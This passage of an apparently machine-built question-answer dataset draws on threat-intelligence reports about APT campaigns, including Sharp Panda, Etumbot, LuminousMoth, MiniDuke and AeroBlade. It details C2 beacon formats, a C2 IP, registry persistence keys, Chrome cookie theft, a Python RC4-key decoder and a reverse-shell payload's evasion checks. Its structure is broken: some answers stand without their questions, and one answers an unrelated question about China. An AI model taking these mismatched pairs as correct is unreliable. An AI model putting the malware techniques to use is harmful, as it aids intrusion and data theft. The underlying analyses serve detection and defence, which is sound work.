    "instruction": "'Operation Sharpshooter' Targets Global Defense, Critical Infrastructure\nDecember 12,\n2018\nBy and on Dec 12, 2018\nThis post was written with contributions from the McAfee Advanced Threat Research team.\nThe McAfee Advanced Threat Research team and McAfee Labs Malware Operations Group have discovered a new global campaign targeting nuclear, defense, energy, and financial companies, based on McAfee\u00ae Global Threat Intelligence. This campaign, Operation Sharpshooter, leverages an in-memory implant to download and retrieve a second-stage implant\u2014which we call Rising Sun\u2014for further exploitation. According to our analysis, the (<https://www.computerworld.com/article/2998498/malware-vulnerabilities/s-korean-manufacturing-industry-targeted-with-new-backdoor-program.html>)Rising Sun implant uses source code from the Lazarus Group's 2015 backdoor in a new framework to infiltrate these key industries.\nOperation Sharpshooter's numerous technical links to the Lazarus Group seem too obvious to immediately draw the conclusion that they are responsible for the attacks, and instead indicate a potential for false flags. Our research focuses on how this actor operates, the global impact, and how to detect the attack. We shall leave attribution to the broader security community.\nQ: How does Operation Sharpshooter leverage its initial implant to facilitate further exploitation, and what implications does this have for defending against such attacks?",
    "output": "Operation Sharpshooter utilizes an in-memory implant to download and retrieve a second-stage implant known as 'Rising Sun.' This two-stage approach allows the attackers to initially establish a foothold within the targeted systems without leaving persistent artifacts on disk, making detection more challenging. The Rising Sun implant then facilitates further exploitation by providing additional capabilities for the attackers. This methodology highlights the importance of advanced threat detection mechanisms that can identify in-memory threats and the need for robust incident response plans to mitigate the risks associated with multi-stage attacks.",

In the case of APT3's Operation Double Tap, the use of CVE-2014-4113, a privilege escalation vulnerability, demonstrates a clear attempt to gain elevated access. By exploiting this vulnerability, APT3 can potentially gain SYSTEM/root level or local administrator access, allowing them to perform actions that would otherwise be restricted. This is a classic example of Privilege Escalation, where an adversary takes advantage of a system weakness to gain the necessary permissions to achieve their objectives. Furthermore, the fact that APT3 is using a known vulnerability in tandem with another exploit (CVE-2014-6332) suggests a shift in strategy and operational tempo for this group, highlighting the importance of Privilege Escalation in their tactics.",

    "instruction": "Big Headline: INFECTION SPREAD\nEvidence shows that the Explosive Trojan leverages its keylogging capabilities to gain access to administrator passwords entered on the target servers. Additionally, residues of custom-built port scanners and several other attack tools have been found on the victim servers, leading us to believe the attackers use the initially infected servers as a pivot to manually spread to the entire network.\nMore recent versions of the Explosive Trojan contain a configurable option for USB infection. When this option is enabled, Explosive infects any writable mass storage device connected to the server. This can be used to infect additional servers in environments where operational mass storage devices are shared between servers, as well as infect an administrator's home or office machines. For additional information on the USB infection process, see Appendix B.\nBig Headline: ATTRIBUTION\nMalware attribution has always been a difficult task and Volatile Cedar is no different. Although we have no hard evidence upon which to base our conclusions, and many of the factors we rely on can in theory be forged or misinterpreted, we believe the unique combination of these factors reveal the attacker's agenda and provide a good estimation of his whereabouts.\n1. To assign a rough geographical location, we observed the UTC creation times of detected samples. The results can be seen in the following table:\nWith conventional working hours usually between 08:00-17:00, the creation locale time can be comfortably correlated to GMT+2.\n2. To further align our results, we took into account several other factors collected from the C&C server infrastructure:\n\u2022 The C&C servers for the first Explosive version were hosted at a major Lebanese hosting company. This is not commonly seen in the malware arena.\n\u2022 DNS registrant information from several of the infrastructure servers shows that they are or were previously registered under contacts with a very similar Lebanese address.\n\u2022 Careful observation of DNS registrant contact information history has revealed an OPSEC failure by the attackers in one instance. For a brief period (possibly before the server was operational), WHOIS privacy was inactive, pointing at a real identity of the registrant. This e-mail address leads to social media accounts that show public and clear affinity with Lebanese political activism.\nWhile not all of the targets have been identified yet, we can start building a profile of the intended victims. Some of the confirmed targets can be associated with organizations related to the state of Israel, and some are Lebanon-based, potentially testifying to in-state espionage among rival political groups.\nOther factors to consider are the low infection rate and the targeted nature of this campaign. These suggest that the attacker's motives are not financial but aim to extract sensitive information from the targets.The combination of these factors leads us to believe that the attack originated or is sponsored by groups affiliated with Lebanon and the specific targets are chosen based on nation-state/political-group interests.\nRead the text above and answer this question: How does the Explosive Trojan used by Volatile Cedar leverage its keylogging capabilities to facilitate the spread of infection across a network?",

    "output": "China has shifted its espionage efforts towards cyber operations because it offers several advantages compared to traditional human espionage. Firstly, it does not require sending anyone overseas, which reduces the risk of defection and the need for lengthy training processes. Secondly, hacking operations can be broken down into simple tasks and partly automated, minimizing the need for operators with advanced technical skills. Thirdly, conducting these operations is cheap and carries a lesser risk than human espionage, as the sponsoring government can claim to be a victim of mistaken identity or a conspiracy. Most importantly, any piece of information stored on a computer or network connected to the Internet is only a few clicks away from being stolen, making cyber operations highly effective for espionage purposes.",

The Shellcode for communication is conducted depending on Beacon mode which is generated on the basis of automatic attack detection platform-Cobalt Strike. This kind of attack pattern disguising as non-malicious real file in the host of its target, it sending a network heartbeat package every 60 seconds, and it also send data information via the Cookie field, all these features of this attack pattern are designed to evade the detection of security software and the interception of firewall on the targeted host. Considering the relationship between this attack and Cobalt Strike platform, we name it as APT-TOCS (TOCS refers to Threat on Cobalt Strike.) for now.\nThe core step of APT-TOCS is downloading the script functionalities of Shellcode, which downloads a field of data into memory for operation by calling powershell.exe.The decrypted data is a field of executable Shellcode that is generated by Cobalt Strike (An automatic attack testing platform). After loading the script of Shellcode, the Analysis Group of ANTIY did a series of correlation analysis, then we found a PE program that maybe act as a guiding executable file in similar attacks. The loaded Shellcode script can be used to call command line to add a certain field of encrypted date into memory and run it. The decrypted date turns out to be executable Shellcode which is generated by Cobalt Strike. The related script can be loaded via the guiding PE program or vulnerability. This kind of attack pattern has several features which including running in memory, no hard disk writing operations, communicating via Beacon, multi-beacon communication is acceptable, and several Beacons can work simultaneously. Such attack can be launched without the support of vector file, in fact it depends on network projection and laterally move in the internal network as required conducting an attack. So, it will bring great difficulties to the forensic work. It is important to note that, all the Sandboxes we know are disabling to fight against this kind of attack.\nIt seems that the attack capability of APT-TOCS is close to that of APT-level. However, it relied on automatic attack testing platform instead of abilities of the attack team.\nAnswer this question: How does the APT-TOCS attack leverage Cobalt Strike to evade detection, and what specific techniques are employed to achieve this?",

    "instruction": "Small Headline: Bot registration and victim fingerprinting\nThe first request is sent to the specified URL with the ClientHello parameter. The MD5 header is an MD5 hash of the body. As there is no data transferred by this request, the MD5 ( d41d8cd98f00b204e9800998ecf8427e ) is of an empty string. In further analysis of the requests, we omit the common headers (Cache-Control, Connection, User-Agent, MD5 and Host) as their meaning doesn't change between the requests.\nGET /index.php?ClientHello HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)\nMD5: d41d8cd98f00b204e9800998ecf8427e\nContent-Length: 0\nHost: 103.159.132.96\nThe expected response from the C&C server is ERR! ParamError! In case of a bad or no response, the backdoor attempts to resolve the IP address of the C&C server on its own through the DNS servers in the config.\nIf the response is correct, it saves the C&C IP address in this format: SVR:[IP_field_from_config]:[CntPort] to the registry key HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\SVIF .\nNext, the module performs a full system enumeration and collects the following data:\nProcessor name and the number of processors, total physical memory and total available physical memory, and information about the hard disk such as total space and free space.\nThe OS architecture and various information from the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion registry key such as ProductName, CSDVersion, ProductId, RegisteredOwner, RegisteredOrganization etc.\nComputer name and information about the current user, such as admin rights retrieved with NetUserGetInfo API.\nTime zone information from\nboth HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation and HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones registry.\nLocal IP address of the machine, and its public IP address, obtained by issuing a request to one of the public IP resolution services such as https://www.whatismyip.com/ :\nAfter the system enumeration, the backdoor generates a botUUID , concatenating with \"-\" two MD5 strings based on various parameters from the enumerated data. It saves the botUUID to the registry key HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\UUID . The resulting botUUID looks like this:\n5d41402abc4b2a76b9719d911017c592-7d793037a0760186574b0282f2f435e7\nand is used in all the following network requests.\nSmall Headline: New C&C connection\nAfter the system enumeration, the backdoor issues a series of requests to \"register\" a new connection and perform validation against the C&C server.\nFirst, the backdoor notifies the server of a new connection. It is implemented as a DELETE request with the botUUID:\nDELETE /index.php?[botUUID];[botUUID].txt HTTP/1.1\nThe accepted response from the C&C: OK!\nNext, the Connect request is sent, whose body contained Base64 of the string ConnectXXXXXXXX , where XXXXXXXX is the connection timestamp retrieved by GetTickCount() API.\nPOST /index.php?[botUUID]/REQ.dat HTTP/1.1\n[Base64-encoded string]\nThe accepted response from the C&C: OK!\nThe following request prepares the server to receive the enumeration data from the victim's machine:\nGET /index.php?Enum;[botUUID]_[connection_timestamp].txt HTTP/1.1\nThe accepted response from the C&C is a string that looks like this: ./Updata/[botUUID]_[connection_timestamp].txt .\nThis is most likely the path on the server to store the enumeration data.\nAfter this the backdoor sends another network request, possibly for verification:\nGET /index.php?D;[botUUID]_[connection_timestamp].txt HTTP/1.1\nThe accepted response is a base64-encoded string that contains the botUUID.\nAt the end of this process, if all the requests are successful, the backdoor is \"registered\" at the C&C server and continues sending information about the system.\nSmall Headline: Send enumerated data\nFrom this point on, the data sent between the backdoor and the C&C server relies on another struct, c2_body :\nstruct c2_body\n{\nDWORD special_flag;\nDWORD additional_data;\nDWORD const_float;\nBYTE command_id;\n};\nconst_float , where used, is a hardcoded value, 5.2509999. special_flag and additional_data seem to be multipurpose variables that have different meanings in different contexts of the program execution. When sent in the body of both requests and responses, this struct is compressed according to the previously described compressed_data struct from SoulSearcher, and then encoded with Base64.\nFirst, the backdoor sends the current timestamp in the request to the following URL (a new timestamp is again retrieved by GetTickCount() API).\nPOST /index.php?CU;[botUUID]_[connection_timestamp].txt;[botUUID]/Data_S_[session_timestamp].dat HTTP/1.1\n[base64-encoded and compressed c2_body]\nIn this request, special_flag is 0x00, command_id is 0x01 and additonal_data is the tick count. The accepted response is OK! Otherwise, the backdoor sleeps and starts the connection from the beginning.\nNext, the backdoor collects the enumeration data again, and compresses it using another struct:\nstruct enum_compressed_data\n{\nc2_body c2_msg;\ncompressed_data enum_data;\n};\nThe struct is then encoded with Base64 and sent in the body of the following request (the URL and methods are the same):\nPOST /index.php?CU;[botUUID]_[connection_timestamp].txt;[botUUID]/Data_S_[session_timestamp].dat HTTP/1.1\n[base64-encoded and compressed enum_compressed_data]\nThe command_id is the same 0x01, special_flag =0, additional_data = 0x4000 + 0x49 = size of enum data.\nThe accepted response is also OK!\nSmall Headline: Main C&C loop\nAfter posting the enumeration data, the backdoor enters an infinite loop, contacting the C&C server with the following request to receive the commands:\nGET /index.php?CDD;[botUUID]_[connection_timestamp].txt;[botUUID]_[connection_timestamp]/Data_C_* HTTP/1.1\nIf there is no C&C command for the victim, the server responds with ERR! Path not found, WAIT!\nIf there is a command to execute, the C&C returns it in a base64-encoded string which is decompressed with compressed_data and parsed as c2_body . Then the command_id from the struct is translated to the actual command execution.\nMedium Headline: Soul Backdoor Commands\nThe main commands that can be received from the C&C server are control messages for the bot:\nIf in the c2_body the special_flag is set to one, the backdoor starts a continuous loop requesting data from the C&C server. The server should respond with a module name to be loaded from the Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\Assemblies registry key, which is executed from its Construct export. Then the backdoor proceeds to execute the command specified in command_id .\nIf the command_id is 0x04 , the backdoor spawns a new \"command execution\" thread that performs a similar network communication flow as the main thread, only without sending the enumeration data.\nIt then begins handling the following commands:\nAll the received modules are stored compressed in the registry. The decompression is performed according to another struct:\nstruct stored_module\n{\nfloat version_or_id;\nQWORD decompressed_size;\nQWORD compressed_size;\nBYTE md5sum[33];\nBYTE compressed_data[];\n};\nWe didn't witness any follow-up modules, but due to the modular nature of the backdoor, we can expect the actors to use all kinds of data-stealing modules, keyloggers, data exfiltration modules and likely also a lateral movement toolset.\n\nAnswer this question based on the above context: Explain the structure and purpose of the `c2_body` struct used in the communication between the Sharp Panda backdoor and the C&C server. How is this struct utilized in the process of sending enumerated data?",
    "output": "The `c2_body` struct is used in the communication between the Sharp Panda backdoor and the C&C server. It consists of four fields: `special_flag`, `additional_data`, `const_float`, and `command_id`. `const_float` is a hardcoded value (5.2509999), while `special_flag` and `additional_data` have different meanings depending on the context. When sent in requests and responses, this struct is compressed and then encoded with Base64. In the process of sending enumerated data, the backdoor first sends a POST request with the current timestamp, where `special_flag` is 0x00, `command_id` is 0x01, and `additional_data` is the tick count. If the response is 'OK!', the backdoor collects enumeration data again, compresses it using the `enum_compressed_data` struct, and sends it in another POST request. The `command_id` remains 0x01, `special_flag` is 0, and `additional_data` is the size of the enum data plus 0x4000.",

    "instruction": "Big Headline: Post exploitation tool: Fake Zoom application\nThe attackers deployed an additional malicious tool on some of the infected systems in Myanmar. Its purpose is to scan the infected systems for files with predefined extensions and exfiltrate them to a C2 server. Interestingly, this stealer impersonates the popular Zoom video telephony software. One measure to make it seem benign is a valid digital signature provided with the binary along with a certificate that is owned by Founder Technology, a subsidiary of Peking University's Founder Group, located in Shanghai.\nMedium Headline: Valid certificate of the fake Zoom application\nTo facilitate the exfiltration of data, the stealer parses a configuration file called \"zVideoUpdate.ini\". While it is unclear how the malware is written to disk by the attackers, it is vital that the .ini file is dropped alongside it and placed in the same directory in order to work. The configuration parameters that comprise this file are as follows:\nEach field in the configuration file (with the exception of Version, ArgName and zCrashReport) is encoded with Base64. While the authors incorporated logic and parameters that allow the decryption of some of the fields specified above with the AES algorithm, it remains unused.\nThe stealer uses the parameters in order to scan the three specified directories (along with root paths of fixed and removable drives) and search for files with the extensions given in the zKBCrypto parameter. Matching files will then be copied to a staging directory created by the malware in a path constructed with the following structure: \"<zWebService>\\%Y-%m-%d %H-%M-%S<zCrashReport>\". The string format in the directory's name represents the time and date of the malware's execution.\nIn addition, the malware collects the metadata of the stolen files. One piece of data can be found as a list of original paths corresponding to the exfiltrated files that is written to a file named 'VideoCoingLog.txt'. This file resides in the aforementioned staging directory. Likewise, a second file is used to hold the list of hashes corresponding to the exfiltrated files and placed in the path specified in the zzhost parameter.\nAfter collection of the targeted files and their metadata, the malware executes an external utility in order to archive the staging directory into a .rar file that will be placed in the path specified in the zWebService parameter. The malware assumes the existence of the utility in a path specified under the XmppDll parameter, suggesting the attackers have prior knowledge of the infected system and its pre-installed applications.\nFinally, the malware seeks all files with a .rar extension within the zWebService directory that should be transmitted to the C2. The method used to send the archive makes use of a statically linked CURL library, which sets the parameters specified below when conducting the transaction to the server. The address of the C2 is\ntaken from the zAutoUpdate parameter.\nBig Headline: Post exploitation tool: Chrome Cookies Stealer\nThe attackers deployed another tool on some infected systems that steals cookies from the Chrome browser. This tool requires the local username as an argument, as it is needed to access two files containing the data to be stolen:\n1 C:\\Users\\[USERNAME]\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\n2 C:\\Users\\[USERNAME]\\AppData\\Local\\Google\\Chrome\\User Data\\Local State\nThe stealer starts by extracting the encrypted_key value stored in the \"Local State\" file. This key is base64 encoded and used to decode the cookies stored in the \"Cookies\" file. The stealer uses the CryptUnprotectData API function to decrypt the cookies and looks for eight specific cookie values: SID, OSID, HSID, SSID, LSID, APISID, SAPISID and ACCOUNT_CHOOSER:\n\nWhat specific techniques does the LuminousMoth APT group employ to steal cookies from the Chrome browser on infected systems? Explain the process, including the files accessed and the encryption methods used.",

    "instruction": "Medium Headline: Stage 2: Persistence, Distraction, HTTP Beacon and Crypto Functionality\nAs the backdoor executes from our previous example, C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ kb71271.log is created and contains the following registry file to make the malware persistent:\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run] \"JavaSvc\"=\"C:\\\\Documents and Settings\\\\User\\\\Application Data\\\\JAVA\\\\JavaSvc.exe\"\nThe dropper then calls regedit with kb71271.log as a parameter to modify the registry. kb71271.log is then deleted. These temp files appear to be static and used across multiple samples of Etumbot and IXESHE. Various other samples were found using this same naming scheme.\nNext, C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ka4281x3.log is created, filled with contents of the bait/distraction file, and then copied to C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\~t3fcj1.doc, which is then opened. If Word isn't installed, then notepad will open the file instead. The ka4281x3.log file is then deleted.\nReturning to the first sample, once the dropper (ff5a7a610746ab5492cc6ab284138852) installs the Etumbot backdoor (82d4850a02375a7447d2d0381b642a72), an initial HTTP beacon is sent to the Command & Control server that requests an RC4 encryption key. The beacon takes the form of a GET request to /home/index.asp?typeid=N where N is a randomly selected odd number between 1 and 13. If the C&C is online, the decoded response payload will contain the RC4 key that is used to encrypt subsequent communication.\nIf the C&C does not send a valid response, the bot will re-send the initial request every 45 seconds.\nWhile the user-agent may appear to be legitimate, it only occurred 39 times in a corpus of over 61 million HTTP requests. Due to the possibility of this User-Agent appearing in legitimate traffic, other indicators \u2013 such as the additional fake Referer value of http://www.google.com should be present before compromise is assumed. All of the headers in the HTTP request are hard-coded in both order and value, so they may be used to provide additional indicators of compromise.\nIf the C&C is online and responds to the beacon, then the RC4 key is delivered to the bot in a string of base64 encoded characters. Etumbot uses a url-safe base64 alphabet, i.e., any characters that would require URL-encoding are replaced. Usage of base64 is a technique consistent with previous analysis done on IXESHE malware. [2,7] In the case of Base64, the \"/\" and \"=\" characters are replaced with \"_\" and \"-\" respectively. The payload from the C&C contains an 8-byte command code in little-endian format, followed by a null-terminated string argument if the command requires it. In the case of the initial beacon response, the RC4 key is located after the command code and has been observed to be e65wb24n5 for all live C&C's that ASERT has analyzed.\nAn example of this initial beacon and delivery of RC4 key is as follows.\nThe RC4 key can be obtained from the C&C response with the following python:\nimport base64\nc2_response=\"\"\"AQAAAAAAAABlNjV3YjI0bjUAAAAAAAAAAAAAAG5FAVBvIz8hYk08ITI4BA0lMTBvBRx0NB18 BndMcFMKQhR5PxxkQ3VnFEALeXA6C3RPBmJLHBBccHQINEl9I3kMUk0lOT4wCFgqD3khTjl5IEAqGzU_DmtU eEJBYSQHEiwRADteMEFjTw5oXgtjGkUxL14JPlwyYQQXPkVaQiAyUBEaJWlkOQEmZRoXZ10EN3RndH0kbEEre w0NUklhFRlpNDJofS1hPQMCeWUvHSQPA2ZAPHEcCRkLPURbCC8bdTgIXXcIBhBbVlhjdB8iL2Y_TCNldTNjZkE vB0M5BWtaOkBALj4KIA5UBjhVPxhhSk1fAwdKKi8zdhl6TkthRUZAOQdICRgFEgY0dwpQNjtlQgR8DzM9N3NQ BhteHgdwaVtycDZvS1Q3CTYhARI1GBMrWh1FQxcdQhV7MSx+NQxqFHgVKHRAdBIBIzNFP14gLHErBAYeWH 1jGCMAdlx5MWAuFk5TW3M+UxFMclIsclEAbzgzB2NSOX0iYBBucmthDyYaZR8tBBMbJjMoCXleMkM+YjdfCHc xIUBHbic+RiEeNwAvWD40W2p0diUyCTJHFEU+KRc+ZFVJTA0zHgxwAiJva306KXkIL3ZnRwAIKCh4M3sgFgZ ZGU9lFXg4ancZFSAlNl1RaRQ8b3drCWofbWB+fkIyKEJ8AnJlaUAxEglWZSM+TWFEAE4aCnFpe1JpB1xTBSgfE UwVUh1UDE5UVC1qanIcXXlfcmRzdWkPK2doDlBhVmx4dm8zUkFgMWJHdRhzRSdrKwk_KWAadyAqMEg2MlE YNVl9Wl84bQtVcRYpFHAXGg8kQiI6E1xiBApHV3ZDLBY+G2sADmJXUC9OCixmBEYUNGBXATh0QVxUNTwyQ nhbXRxNTHlCEAlYBXhyTWdyQRcNBxskBRlRBn42HlhNbEtnJCk4QkIoDzRbEChGLi10ERpgZTpNNCJjKEUNOhh lcRR1Dkw+ITMAYAleCDQdTVpTHGQbXwktTmROQiooaEtLLHcILTo4an08I1p9H2IPeBseLiUScQp3Xg--\n\"\"\".replace('_','/').replace('-','=') c2_response=base64.b64decode(c2_response) rc4_key = c2_response[8:8+c2_response[8:].find('\\x00')] print rc4_key e65wb24n5\nWhile a payload of 1080 bytes is sent back, the majority appears to be random padding.\nOnce the bot has received the encryption key, the bot sends a registration callback to the C&C /image/<encrypted data>.jpg containing the encrypted values of system information to include the NetBIOS name of the system, user name, IP address, if the system is using a proxy (Yes/No), and a numeric value which may be some type of campaign code. IXESHE malware has also been observed using a unique campaign code that is delivered back to the C&C. [7]\nEtumbot discovers the proxy settings of the local machine. If a proxy is defined, communications to the C&C bypass the proxy and go directly to the Internet. Environments with system-defined proxies won't get this activity in proxy logs, however transparent proxies may see this activity.\nA contrived example of this registration string generated by the Etumbot backdoor prior to encryption is as follows:\nWINXPBOX|johnsmith|10.0.1.15|No Proxy|05147|\nA bot registration call to /image\nOnce the bot has registered with the C&C, it will send periodic pings to ask for new commands to execute. The URI for the ping requests is /history/<encrypted NetBIOS name>.asp, where encrypted NetBIOS name is the url-safe base64 encoding of the rc4-encrypted NetBIOS name.\n\nQ: Describe the process by which Etumbot communicates with its Command & Control (C&C) server, including the initial beacon, encryption key retrieval, and subsequent communication. What techniques are used to obfuscate this communication?",
    "output": "A: Etumbot initiates communication with its C&C server by sending an initial HTTP beacon in the form of a GET request to '/home/index.asp?typeid=N', where N is a randomly selected odd number between 1 and 13. If the C&C server is online, it responds with a base64-encoded payload containing an RC4 encryption key. This key is used to encrypt all subsequent communication. The base64 encoding uses a url-safe alphabet, replacing '/' and '=' with '_' and '-' respectively. Once the bot receives the RC4 key, it sends a registration callback to the C&C at '/image/<encrypted data>.jpg', containing encrypted system information such as the NetBIOS name, username, IP address, proxy usage, and a campaign code. After registration, the bot sends periodic pings to the C&C to check for new commands, using the URI '/history/<encrypted NetBIOS name>.asp'. The obfuscation techniques include the use of base64 encoding, RC4 encryption, and hard-coded HTTP headers to evade detection.",

    "instruction": "Big Headline: (or 'how many cool words can you fit into one title')\nAuthors:\nCostin Raiu, Igor Soumenkov, Kurt Baumgartner, Vitaly Kamluk\nGlobal Research and Analysis Team, Kaspersky Lab\nOn Feb 12th 2013, FireEye announced the discovery () of an Adobe Reader 0-day exploit which is used to drop a previously unknown, advanced piece of malware. We called this new malware \"ItaDuke\" because it reminded us of Duqu and because of the ancient Italian comments in the shellcode copied from Dante Aligheri's Divine Comedy.\nSince the original announcement, we have observed several new incidents using the same exploit (CVE-2013-0640), some of which were so unusual that we decided to analyze them in depth.\nTogether with our partner CrySyS Lab, we've performed a detailed analysis of these new incidents which indicate a new, previously unknown threat actor. For their analysis, please read . For our analysis, please read below.\nFirst of all, while the fake \"Mandiant\" PDF reports (see ) are just dirty hacks of the original exploit, these newer attacks appear to have been created by a 0-day toolkit that was used to build the original \"Visaform Tukey.pdf\" discovered by FireEye.\nThe new PDF attacks drop fake documents that are shown to the victim if the exploit is successfully executed. The documents refer to a human rights seminar (ASEM) and Ukraine's foreign policy and NATO membership plans:\nDocument used against the Hungarian target\nDocument used against the Belgian target\nThe MD5s for the documents used in this attack are:\n3668b018b4bb080d1875aee346e3650a 88292d7181514fda5390292d73da28d4 3f301758aa3d5d123a9ddbad1890853b 0cdf55626e56ffbf1b198beb4f6ed559 cf5a5239ada9b43592757c0d7bf66169 c03bcb0cde62b3f45b4d772ab635e2b0\naction_plan.pdf (Country: Belgium)\nASEM_seminar.pdf (Country: Hungary)\nEUAG_report.pdf (Country: Luxembourg) report.pdf (Country: Spain)\nEUAG_report.pdf (Country: Belgium)\nThe 2013 Armenian Economic Association.pdf (Country: Belgium)\nThe JavaScript exploit code has been modified since the original attack. For instance, the function named \"oTHERWISE\" was renamed to \"q1w2e3r4t\". The function is later called in the code like this:\nNew exploit:\nvar sCIENZA = q1w2e3r4t(vOLENCI[sHOGG('ODNEDNERp',3329,7937)], gIRARSI);\nOlder (\"Visaform Turkey.pdf\") exploit:\nvar sCIENZA = oTHERWISE (vOLENCI['pRENDENDO'], gIRARSI);\nIn addition, the JS code is now in compressed format, while the original sample had it in plaintext. The reason behind the changes is probably to avoid detection by anti-malware products although this doesn't prevent our product from detecting it heuristically as \"HEUR:Exploit.Script.Generic\".\nThe shellcode contained in the PDF document is similar to that used in the documents carrying the \"Itaduke\" payload, with some differences. For instance, after exploiting the vulnerability, it searches for a specific signature within the PDF file. While the \"Itaduke\" shellcode was looking for \"!H2bYm.Sw@\", the MiniDuke version uses a different signature, \"@34fZ7E*p\\\".\nSignature in the Itaduke PDF file\nSignature in the Miniduke PDF file\nOnce the payload signature is found, it is decrypted with XOR and then decompressed using RtlDecompressBuffer API (LZNT1). The resulting PE file is written to a temporary file and loaded using LoadLibary API.\nThe resulting dynamic library implements the second stage of installation. It contains two binary resources, 101 and 102. Resource 101 is the main backdoor DLL component. It is written to the %AppData% directory and loaded using LoadLibary API. Resource 102 is the decoy PDF document. It is written to the Internet cache directory and then opened using a simple BAT file:\nTASKKILL /F /IM acro*\nThe filenames of the dropped files are hardcoded in their resources.\nBeginning of the resource 101 with its filename\nBeginning of the resource 102 with its filename\nInterestingly, the malware dropper contains the following paths:\n\u25cf \"c:\\src\\dlldropper\\Release\\L2P.pdb\".\n\u25cf \"C:\\src\\hellodll\\Release\\hellodll.pdb\".\nThese paths did not exist in the dropper of original PDF (\"Visaform Turkey.pdf\").\nIf we are to trust the PE headers, the dropper was compiled on Feb 20, 2013:\n'Hungarian' dropper compilation time - \"Feb 20 10:51:16 2013\"\nThe backdoor used in the Hungarian case was compiled on \"Feb 20 10:57:52 2013\", just minutes after the dropper was created.\nPerhaps the most unusual thing about these three new attacks is the malware they drop. In all the analyzed cases, the dropped malware is in the form of a 22,528 bytes DLL file. Parts of the malicious DLL file are encrypted with information related to the system configuration, which ensures it will only work properly on the victim's system. If copied to another computer, the malware will be unable to function successfully.\nThe backdoor is written in \"old school\" assembler and is tiny by current standards - only 20 KB. This is most unusual for modern malware, which can be several megabytes in size. It has a small decryptor at the beginning that decrypts the main body. All three cases use different encryption keys. Another peculiarity is that the backdoor has no imports: all functions are scanned from memory and are called dynamically. It is also interesting that the first two Win32 APIs resolved and called by the unpacking stub are ntdll.LdrLoadDll and kernel32.VirtualProtectEx. These two functions are not called according to the \"_stdcall\" convention. Instead, a 'jmp ebx' instruction is executed after manually building the stack. Clearly some thought went into creating anti-emulation and anti-scanning techniques with this malware.\nRead the text above and answer this question: Why did the authors of the APT report 'themysteryofthepdf0-dayassemblermicrobackdoor' decide to call the new malware 'ItaDuke', and what significance does this name hold in relation to other known malware?",
    "output": "The authors named the new malware 'ItaDuke' because it reminded them of Duqu, another sophisticated piece of malware, and because of the ancient Italian comments in the shellcode that were copied from Dante Alighieri's Divine Comedy. This naming highlights the similarities in complexity and potential origins, suggesting that the creators of ItaDuke might be influenced by or connected to the creators of Duqu.",

    "instruction": "Medium Headline: Context\nThe BlackBerry Threat Research and Intelligence team recently uncovered two campaigns by a previously unknown threat actor, which we have named AeroBlade, targeting an aerospace industry company in the U.S. We found two phases of the attack chain. The initial attack was conducted in September 2022, and based on our technical analysis, we have concluded this was a \"testing\" stage. The second attack occurred in July 2023.\nThere are certain similarities between both campaigns:\nBoth lure documents were named \"[redacted].docx.\"\nThe final payload is a reverse shell.\nThe command-and-control (C2) server IP address is the same.\nThere are also some interesting differences between the two campaigns:\nThe final payload of the 2023 attack is stealthier and uses more obfuscation and anti-analysis techniques.\nThe 2023 campaign's final payload includes an option to list directories from infected victims.\nDuring an attack, a malicious Microsoft Word document called [redacted].docx is delivered via email spear-phishing, which, when executed manually by the user, employs a remote template injection to download a second stage file called \"[redacted].dotm\". This file in turn executes \"item3.xml\", which creates a reverse shell connecting to \"redacted[.]redacted[.]com\" over port 443.\nMedium Headline: First Stage\nThe first stage of the infection is a targeted email that has a malicious document attachment with the filename [redacted].docx. When opened, the document displays text in a deliberately scrambled font, along with a \"lure\" message asking the potential victim to click it to enable the content in MS Office.\nThe docx document employs remote template injection, MITRE ATT&CK technique , to download the second stage of the infection.\nThe next-stage information is saved in an XML (eXtensible Markup Language) file inside a .dotm file. A .dotm file is a document template created by Microsoft Word, containing the default layout, settings, and macros for a document.\nhxxp://[redacted].106.27. [redacted]/[redacted][.]dotm\nOnce the victim opens the file and executes it by manually clicking the \"Enable Content\" lure message, the [redacted].dotm document discretely drops a new file to the system, and opens it. The newly downloaded document is readable, leading the victim to believe that the file initially received by email is legitimate. In fact, it's a classic cyber bait-and-switch, performed invisibly right under the victim's nose.\nIt's interesting to note that the body of the first-stage document contains an executable library that runs with the help of the second stage \u2014 we'll take a closer look at this executable library a little later on in this report.\nBig Headline: Payload\nThe final payload is a DLL that acts as a reverse shell that connects to a hard-coded C2 server. Reverse shells allow attackers to open ports to the target machines, forcing communication and enabling a complete takeover of the device. It is therefore a severe security threat.\nThe DLL is also capable of listing all directories found on the now-infected system. It is a heavily obfuscated executable which implements complex techniques, such as:\nAnti-disassembly techniques to make analysis harder\nAPI hashing to hide its usage of Windows functions; The hash function used is .\nCustom encoding for each string used\nMultiple checks are implemented to avoid the malware running on an automated environment such as a sandbox; This impedes analysis.\nFor anti-disassembly, the executable contains control flow obfuscation, usage of data between code, and dead code-executed instructions that do not affect the malware. Dead code is a section in the source code of a program which is executed, but whose result is never used in any other computation. These techniques are all added to make analysis harder for defenders.\nThe executable also implements techniques that causes the malware to skip execution on automated systems, such as sandboxes or antivirus (AV) emulators. These techniques include:\nComparing the position of the mouse cursor using the GetCursorPos() function\nComparing time elapsed on execution using the function GetTickCount()\nChecking to see if the number of processors is less than two, using the NumberOfProcessors from the Process Environment Block (PEB) structure\nChecking physical memory size using the function GlobalMemoryStatusEx()\nAfter passing all those checks, the malicious DLL executes the following sequence:\nDecrypts embedded static configuration containing the C2 server information for it to connect to\nCollects system information from the infected machine\nSets persistence to survive upon system reboot\nFinally, it connects to the C2 server, transmitting all its collected information, and spawning a reverse shell, while also sending a list of directories found on the infected system.\nStatic configuration is AES encrypted, and once decrypted, contains the following structure:\nFirst DWORD: 0x154, unknown usage, static config size is hard-coded at 72 bytes\nSecond DWORD: 0x1BB, connects to TCP port 443\n16-byte string 